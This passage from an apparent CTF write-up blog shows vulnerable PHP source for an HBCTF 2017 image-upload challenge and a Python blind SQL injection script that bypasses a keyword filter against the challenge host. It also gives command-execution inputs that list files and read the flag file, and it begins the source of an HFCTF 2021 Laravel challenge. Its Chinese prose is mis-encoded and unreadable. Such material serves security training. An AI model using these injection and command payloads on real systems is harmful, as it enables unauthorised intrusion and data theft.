class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">204800</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$reg</span><span class="token operator">=</span><span class="token string">'/^gif|jpg|jpeg|png$/'</span><span class="token punctuation">;</span>    <span class="token variable">$fileExtensionCheck</span><span class="token operator">=</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$reg</span><span class="token punctuation">,</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fileExtensionCheck</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Only upload image file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fileTypeCheck</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$fileOldName</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_FILENAME</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$fileNewName</span> <span class="token operator">=</span> <span class="token string">'./Up10aDs/'</span> <span class="token punctuation">.</span> <span class="token function">random_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span><span class="token string">'.'</span><span class="token punctuation">.</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$userid</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span><span class="token operator">=</span> <span class="token string">"insert into `download` (`uid`,`image_name`,`location`) values ($userid,'$fileOldName','$fileNewName')"</span><span class="token punctuation">;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$conn</span> <span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">&amp;&amp;</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$fileNewName</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('file upload success!');window.location.href='index.php?file=home'&lt;/script>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>             <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('file upload error')&lt;/script>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('file  type error');&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><h5 id="config-php"><a href="#config-php" class="headerlink" title="config.php"></a>config.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dbhost</span> <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span><span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token string">"password987~!@"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string">"dsqli"</span><span class="token punctuation">;</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$dbhost</span><span class="token punctuation">,</span><span class="token variable">$dbuser</span><span class="token punctuation">,</span><span class="token variable">$dbpass</span><span class="token punctuation">,</span><span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$conn</span> <span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"set names utf8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">function</span> <span class="token function">d_addslashes</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$array</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token operator">!</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$value</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>          <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">d_addslashes</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'select'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'update'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'insert'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'delete'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'and'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'or'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'where'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'union'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'like'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'regexp'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'is'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$id</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">random_str</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token string">"32"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$set</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span>  <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"f"</span><span class="token punctuation">,</span>         <span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"j"</span><span class="token punctuation">,</span> <span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"l"</span><span class="token punctuation">,</span>        <span class="token string">"m"</span><span class="token punctuation">,</span><span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span><span class="token string">"s"</span><span class="token punctuation">,</span><span class="token string">"t"</span><span class="token punctuation">,</span><span class="token string">"u"</span><span class="token punctuation">,</span><span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span><span class="token string">"x"</span><span class="token punctuation">,</span>        <span class="token string">"y"</span><span class="token punctuation">,</span><span class="token string">"z"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token string">"9"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token operator">++</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$set</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$set</span><span class="token punctuation">[</span><span class="token variable">$ch</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>å¯çŸ¥æ–‡ä»¶åä¸º<code>./Up10aDs/</code>åŠ ä¸Š32ä¸ºéšæœºå­—æ¯æ•°å­—å†åŠ ä¸ŠåŽŸæ¥çš„åŽç¼€å</p><h5 id="downfile-php"><a href="#downfile-php" class="headerlink" title="downfile.php"></a>downfile.php</h5><pre><code>$sql = "select location from download where (uid=0 and id='$imageid') or uid=".$_SESSION['userid']." and id=$imageid";</code></pre><pre class=" language-Python"><code class="language-Python">import requestsimport timedef str_to_hex(s):    return '0x'+''.join([hex(ord(c)).replace('0x', '') for c in s])url = "http://f763807e-69f9-4d74-8008-00d034e12fd2.node4.buuoj.cn:81/downfile.php"headers = {  'Cookie': '__utma=93156994.1197903980.1594909383.1594909383.1594909383.1; __utmz=93156994.1594909383.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=2e95vmlug30e6l4o8mvap5tsl2'}pay = "123456789:abcdefghijklmnopqrstuvwxyz{"filename="./Up10aDs/"for j in range(40):    for i in pay:        fn = filename+i        payload = {            'image': '2 ununionion seleselectct {} oorrder by 1'.format(str_to_hex(fn)),            'image_download': '%E6%94%B6%E8%97%8F'        }        response = requests.request("POST", url, headers=headers, data=payload)        time.sleep(0.1)        print(response.text)        if "1.php"  in response.text:            filename=filename+chr(ord(i)-1)            print(filename)            break</code></pre><p><img src="/2021/09/09/hbctf-2017-da-mei-xi-an/image-20210910193949421.png" alt="image-20210910193949421"></p><pre><code>./Up10aDs/3k2451nkq11h9hmnbasc3c6t13m91sss</code></pre><pre><code>a=echo `ls`;</code></pre><p><img src="/2021/09/09/hbctf-2017-da-mei-xi-an/image-20210910195046053.png" alt="image-20210910195046053"></p><pre><code>a=echo `cat  F1AgIsH3r3G00d.php`;</code></pre><p><img src="/2021/09/09/hbctf-2017-da-mei-xi-an/image-20210910195057563.png" alt="image-20210910195057563"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HFCTFï¼š2021-tinypng</title>
      <link href="2021/09/08/hfctf-2021-tinypng/"/>
      <url>2021/09/08/hfctf-2021-tinypng/</url>
      
        <content type="html"><![CDATA[<p>ä¸‹è½½æºç </p><p>å‘çŽ°æ˜¯laravelæ¡†æž¶</p><h5 id="routes-web-php"><a href="#routes-web-php" class="headerlink" title="routes/web.php"></a>routes/web.php</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">use</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers<span class="token punctuation">\</span>IndexController</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers<span class="token punctuation">\</span>ImageController</span><span class="token punctuation">;</span>Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>IndexController<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string">'fileUpload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string">'file.upload.post'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Don't expose the /image to others!</span>Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/image'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>ImageController<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string">'handle'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string">'image.handle'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>indexè·¯ç”±æŒ‡å‘IndexControllerçš„fileUploadæ–¹æ³•<br> imageè·¯ç”±æŒ‡å‘ImageControllerçš„handleæ–¹æ³•</p><h5 id="app-Http-Controllers-IndexController-php"><a href="#app-Http-Controllers-IndexController-php" class="headerlink" title="app/Http/Controllers/IndexController.php"></a>app/Http/Controllers/IndexController.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Request</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">fileUpload</span><span class="token punctuation">(</span>Request <span class="token variable">$req</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$allowed_extension</span> <span class="token operator">=</span> <span class="token string">"png"</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token variable">$req</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">clientExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extension</span> <span class="token operator">===</span> <span class="token variable">$allowed_extension</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$req</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">204800</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$req</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/&lt;\?|php|HALT\_COMPILER/i"</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string">'Don\'t do that, please'</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token operator">-</span><span class="token operator">></span><span class="token function">withErrors</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$fileName</span> <span class="token operator">=</span> \<span class="token package">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.png'</span><span class="token punctuation">;</span>                <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token variable">$req</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">storePubliclyAs</span><span class="token punctuation">(</span><span class="token string">'uploads'</span><span class="token punctuation">,</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string">"path: $path"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token operator">-</span><span class="token operator">></span><span class="token function">with</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">,</span> <span class="token string">'File has been uploaded.'</span><span class="token punctuation">)</span>                    <span class="token operator">-</span><span class="token operator">></span><span class="token function">with</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string">'Don\'t do that, please'</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token operator">-</span><span class="token operator">></span><span class="token function">withErrors</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h5 id="app-Http-Controllers-ImageController-php"><a href="#app-Http-Controllers-ImageController-php" class="headerlink" title="app/Http/Controllers/ImageController.php"></a>app/Http/Controllers/ImageController.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Request</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ImageController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span>Request <span class="token variable">$request</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$source</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$source</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$extension</span> <span class="token operator">!==</span> <span class="token string">'png'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string">'Don\'t do that, 